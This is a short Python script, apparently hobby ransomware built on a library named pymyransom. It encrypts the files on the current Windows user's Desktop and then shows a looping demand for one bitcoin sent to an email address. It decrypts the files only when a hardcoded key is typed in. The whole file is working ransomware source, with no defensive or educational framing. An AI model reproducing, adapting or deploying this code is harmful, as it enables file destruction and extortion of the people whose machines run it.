import pymyransom # pip install pymyransom
import getpass
import sys
import os

username = getpass.getuser()

users = f"C:\\Users\\{username}\\Desktop\\**"

Victim = pymyransom.makeMyRansomware(your_extension=".RANSOMWARE", key=b"ransomwaretestte", passFile="Ransomware.exe")
Victim.Encryptor(users)

os.system('cls')

while True:
    print("If you quit this program," + "\n" + "you will not be able to recover your files.")
    print("Send 1bitcoin to aeo6747aeo@gmail.com" + "\n" + "Right Now!")

    key = input("Input Key >>> ")

    if key == 'TzJ6xnH9p$YDT9xS':
        Victim.Decryptor(users)
        print("All files have been recovered! " + "\n" + "You can now close this window!")
        os.system("pause")
        break
    else:
        print("The key is wrong.")

sys.exit()
